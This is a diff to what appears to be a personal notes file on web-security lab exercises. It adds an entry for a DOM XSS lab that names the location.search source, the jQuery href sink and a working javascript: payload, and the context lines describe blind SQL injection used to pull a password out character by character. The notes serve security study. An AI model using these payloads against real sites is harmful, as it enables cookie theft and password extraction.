@@ -328,3 +328,11 @@ websocket, dom-xss, cache-poisoning, clickjacking
     - Extract: SUBSTR(password,N,1) = 'X' char by char
     - Extracted: rdlczw8vy4r6zsrmdags
     - ~420 total requests for 20-char password
+
+### XSS (6)
+65. DOM XSS in jQuery anchor href attribute sink
+    - Source: location.search (returnPath parameter)
+    - Sink: jQuery attr("href", value)
+    - Payload: /feedback?returnPath=javascript:alert(document.cookie)
+    - jQuery code: $('#backLink').attr("href", params.get('returnPath'))
+    - Click back link triggers DOM XSS
